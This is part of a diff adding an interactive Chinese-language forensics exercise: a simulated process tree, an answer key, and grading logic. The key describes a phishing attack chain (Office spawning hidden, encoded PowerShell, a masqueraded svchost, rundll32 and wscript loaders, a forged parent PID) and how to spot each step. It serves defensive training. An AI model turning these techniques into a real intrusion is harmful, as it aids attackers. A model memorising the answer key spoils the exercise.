+    "17":{bad:true, why:"整條鏈的斷點。Office 應用程式沒有任何正當理由建立命令列直譯器（T1566.001 → T1059.001）。再加上 -w hidden 隱藏視窗、-ep bypass 略過執行原則、-enc 編碼命令，三個參數合起來只有一個用途。工作目錄還停在 Outlook 的附件快取目錄，等於自己招認了來源。"},
+    "18":{bad:false,why:"陷阱題。conhost 一定掛在主控台程式底下，這個父子關係本身完全正常 —— 它是 powershell 開啟時由系統配給的主控台宿主。關係正常，脈絡惡意：它證明了 6412 真的跑起來了，但它自己不是壞人。"},
+    "19":{bad:false,why:"PID 回收造成的假象。WmiPrvSE 的啟動時間是 09:15:04，比它「父行程」powershell 的 10:41:52 早了一個半小時 —— 子行程不可能比父行程先出生。真相是它原本的父行程結束後，PID 6412 被系統回收，後來配給了 powershell，工具照 PPID 值畫就把它掛到這裡。啟動時間是拆穿這種假象最快的欄位。"},
+    "20":{bad:true, why:"偽裝（T1036.005）。名字叫 svchost.exe，但真正的 svchost 只會從 System32 執行、父行程只會是 services.exe、命令列一定帶 -k <服務群組>。這一個三項全錯，還落在 AppData\\Roaming、未經簽署，並且對境外位址維持著 443 連線。"},
+    "21":{bad:true, why:"由假 svchost 建立，用 rundll32 執行 %TEMP% 底下的 DLL 匯出函式（T1218.011）。rundll32 本身是有簽章的系統程式，被利用的是它「代替別人執行程式碼」的能力 —— 判斷要看它載入什麼，不是看它是誰。"},
+    "22":{bad:true, why:"唯一異常的 Non-existent process。它的父行程 6688 是攻擊鏈中一個已經結束的中繼行程，所以它現在被畫在樹的最外層，看起來與整件事無關。但命令列是 wscript 用 //B 靜默模式執行 %TEMP% 底下的 .js，而且對外連著 198.51.100.23:80。父行程結束會把樹狀圖切斷 —— 這正是攻擊者樂見的效果，也是為什麼你不能只靠樹狀圖辦案。"}
+  };
+
+  var marks = {}, sel = null, flat = false, showTime = false;
+
+  var $ = function(id){ return document.getElementById(id); };
+  function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+  function byN(n){ for(var i=0;i<P.length;i++){ if(P[i].n===n) return P[i]; } return null; }
+  function ppidOf(r){ var m = r.pp.match(/\((\d+)\)/); return m ? m[1] : null; }
+
+  function view(){
+    var list = P.slice();
+    if(flat) list.sort(function(a,b){ return parseInt(a.pid,10) - parseInt(b.pid,10); });
+    return list;
+  }
+
+  function render(){
+    var tb = $("rows");
+    tb.innerHTML = "";
+    var s = sel ? byN(sel) : null;
+    var sPar = s ? ppidOf(s) : null;
+
+    view().forEach(function(r){
+      var kin = false;
+      if(s && r.n !== s.n){
+        if(sPar && r.pid === sPar) kin = true;            // 選取行的父
+        if(ppidOf(r) === s.pid) kin = true;               // 選取行的子
+      }
+      var tr = document.createElement("tr");
+      tr.className = "row r-" + r.cls + (sel === r.n ? " sel" : (kin ? " kin" : ""));
+      tr.tabIndex = 0;
+      tr.setAttribute("data-n", r.n);
+      var pad = flat ? 8 : (8 + r.d * 15);
+      var tw = flat ? "" : '<span class="twist">' + (r.k ? "\u25BE" : "") + '</span>';
+      var tag = marks[r.n] === "f" ? '<span class="tag f">異常</span>'
+              : marks[r.n] === "c" ? '<span class="tag c">正常</span>' : "";
+      var pp = r.ppd ? '<span class="dead">' + esc(r.pp) + '</span>' : esc(r.pp);
+      tr.innerHTML =
+        '<td class="name" style="padding-left:' + pad + 'px">' + tw + esc(r.name) + '</td>' +
+        '<td class="mono">' + r.pid + '</td>' +
+        '<td class="mono">' + pp + '</td>' +
+        '<td class="num">' + r.cpu + '</td>' +
+        '<td class="num">' + r.mem + '</td>' +
+        '<td class="mono">' + esc(r.user) + '</td>' +
+        '<td class="mono stcol" style="display:' + (showTime ? "table-cell" : "none") + '">' + r.st + '</td>' +
+        '<td>' + esc(r.desc) + '</td>' +
+        '<td>' + tag + '</td>';
+      tb.appendChild(tr);
+    });
+
+    var f = 0, c = 0;
+    Object.keys(marks).forEach(function(k){ marks[k] === "f" ? f++ : c++; });
+    $("score").textContent = "已標記 " + (f + c) + " / 22　　異常 " + f + "　　正常 " + c;
+    ["btnOpen","btnFlag","btnClear"].forEach(function(id){ $(id).disabled = !sel; });
+  }
+
+  function select(n){
+    sel = n;
+    render();
+    var r = byN(n);
+    $("hint").textContent = "已選取 " + r.name + " (" + r.pid + ")，父行程欄位寫著 " + r.pp
+      + "。黃色是它的父與子。Properties 裡有路徑、命令列與簽章。";
+  }
+
+  $("rows").addEventListener("click", function(e){
+    var tr = e.target.closest("tr[data-n]"); if(tr) select(tr.getAttribute("data-n"));
+  });
+  $("rows").addEventListener("dblclick", function(e){
+    var tr = e.target.closest("tr[data-n]");
+    if(tr){ select(tr.getAttribute("data-n")); openDlg(); }
+  });
+  $("rows").addEventListener("keydown", function(e){
+    var tr = e.target.closest("tr[data-n]");
+    if(tr && (e.key === "Enter" || e.key === " ")){ e.preventDefault(); select(tr.getAttribute("data-n")); openDlg(); }
+  });
+
+  $("btnFlat").addEventListener("click", function(){
+    flat = !flat;
+    this.textContent = flat ? "還原樹狀檢視" : "攤平樹狀（依 PID 排序）";
+    $("hint").textContent = flat
+      ? "縮排消失了，剩下 Parent 欄。樹狀圖只是工具拿這一欄畫出來的圖 —— 資料本身從頭到尾都只有這一欄。"
+      : "回到樹狀檢視。";
+    render();
+  });
+  $("btnTime").addEventListener("click", function(){
+    showTime = !showTime;
+    this.textContent = showTime ? "隱藏 Started 欄" : "顯示 Started 欄";
+    $("hint").textContent = showTime
+      ? "先看 10:41 之後啟動的那幾列。再回頭檢查每一組父子：有沒有哪個孩子比父親早出生？"
+      : "已隱藏啟動時間。";
+    render();
+  });
+  $("btnFlag").addEventListener("click", function(){ marks[sel] = "f"; render(); });
+  $("btnClear").addEventListener("click", function(){ marks[sel] = "c"; render(); });
+
+  /* ---- Properties ---- */
+  function row(k, v, warn){
+    return '<span class="k">' + k + '</span><span class="v">'
+         + (warn ? '<span class="dead">' + esc(v) + '</span>' : esc(v)) + '</span>';
+  }
+  function openDlg(){
+    if(!sel) return;
+    var r = byN(sel), d = D[r.pid] || {};
+    $("dlgTitle").textContent = r.name + " (" + r.pid + ") Properties";
+
+    $("kvGeneral").innerHTML =
+      row("File", d.file || r.name) +
+      row("Company", d.company || "（無）", !d.company) +
+      row("Description", r.desc || "（無）", !r.desc) +
+      row("Image path", d.path || "—", /Temp|AppData/i.test(d.path || "")) +
+      row("Command line", d.cmd || "—") +
+      row("Current dir", d.cwd || "—") +
+      row("Signature", d.sig || "—", (d.sig || "").indexOf("※") === 0) +
+      row("Started", "2026-04-22 " + r.st) +
+      row("Parent", r.pp, !!r.ppd) +
+      row("PEB address", "0x7ff" + r.pid + "e000");
+
+    $("kvToken").innerHTML =
+      row("User", r.user) +
+      row("Integrity", d.int || "—") +
+      row("Elevated", d.elev || "—") +
+      row("Session", "1") +
+      row("App container", "否");
+
+    var net = d.net || [];
+    $("netOut").textContent = net.length
+      ? "Protocol  Local address          Remote address        State\n" + net.join("\n")
+      : "（這個行程目前沒有作用中的網路端點）";
+
+    $("btnDec").disabled = !/-enc\s+[A-Za-z0-9+/=]{20,}/.test(d.cmd || "");
+    $("dec").className = "decoded";
+    tab("p1");
+    $("modal").classList.add("open");
+    $("btnX").focus();
+  }
+  function tab(id){
+    ["p1","p2","p3"].forEach(function(p){ $(p).className = "dpane bevel-in" + (p === id ? " on" : ""); });
+    Array.prototype.forEach.call(document.querySelectorAll(".dtab"), function(t){
+      t.className = "dtab" + (t.getAttribute("data-p") === id ? " on" : "");
+    });
+  }
+  Array.prototype.forEach.call(document.querySelectorAll(".dtab"), function(t){
+    t.addEventListener("click", function(){ tab(t.getAttribute("data-p")); });
+  });
+
+  function closeDlg(){ $("modal").classList.remove("open"); }
+  $("btnOpen").addEventListener("click", openDlg);
+  $("btnX").addEventListener("click", closeDlg);
+  $("modal").addEventListener("click", function(e){ if(e.target === this) closeDlg(); });
+  document.addEventListener("keydown", function(e){ if(e.key === "Escape") closeDlg(); });
+
+  $("btnDec").addEventListener("click", function(){
+    var d = D[byN(sel).pid] || {}, m = (d.cmd || "").match(/-enc\s+([A-Za-z0-9+/=]{20,})/);
+    if(!m) return;
+    var bin = atob(m[1]), out = "";
+    for(var i = 0; i < bin.length; i += 2){          // PowerShell -enc 使用 UTF-16LE
+      out += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8));
+    }
+    $("dec").textContent = "解碼結果（UTF-16LE）：" + out;
+    $("dec").className = "decoded show";
+  });
+
+  /* ---- 對答案 ---- */
+  $("btnCheck").addEventListener("click", function(){
+    var v = $("verdict"), html = "", right = 0, done = 0;
+    P.forEach(function(r){
+      var mine = marks[r.n], truth = KEY[r.n].bad ? "f" : "c", ok = mine === truth;
+      if(mine) done++;
+      if(ok) right++;
+      html += '<div class="vrow ' + (ok ? "ok" : (mine ? "no" : "")) + '">'
+            + '<span class="vk">' + (mine ? (ok ? "✓" : "✗") : "–") + " " + r.n + '</span>'
+            + '<span class="vv"><b>' + (KEY[r.n].bad ? "異常" : "正常") + " " + esc(r.name)
+            + " (" + r.pid + ")</b> — " + esc(KEY[r.n].why) + '</span></div>';
+    });
+    var head = "<p><b>" + right + " / 22 正確</b>（已作答 " + done + " 筆）。執行鏈是 "
+      + "<code>OUTLOOK.EXE (4120) → WINWORD.EXE (5308) → powershell.exe (6412) → svchost.exe (6980) → rundll32.exe (7104)</code>，"
+      + "外加兩個被刻意拉出樹外的分支：<code>wscript.exe (7220)</code>（父行程已結束）與 <code>taskhostw.exe (7442)</code>（父行程欄位被偽造）。"
+      + "斷點在 5308 → 6412：Office 建立 PowerShell，這一步在正常辦公情境下不存在。</p>"
+      + "<p>四個 <span class=\"dead\">Non-existent process</span> 裡，只有 7220 是異常；csrss、wininit、winlogon、explorer 全部是 Windows 的正常現象。"
+      + "反過來，看起來位置最正確的 7442 才是偽造的。這一題的重點就是這個不對稱：<em>樹狀圖上的位置最容易造假，路徑、簽章、命令列、啟動時間最難造假。</em>"
+      + "判讀順序永遠是先看後者，再回頭解釋前者。</p>";
+    v.innerHTML = "<h2>判讀對照</h2>" + head + html;
+    v.className = "verdict show";
+    v.scrollIntoView({behavior:"smooth",block:"nearest"});
+  });
+
+  render();
+})();
+</script>
+</body>
+</html>
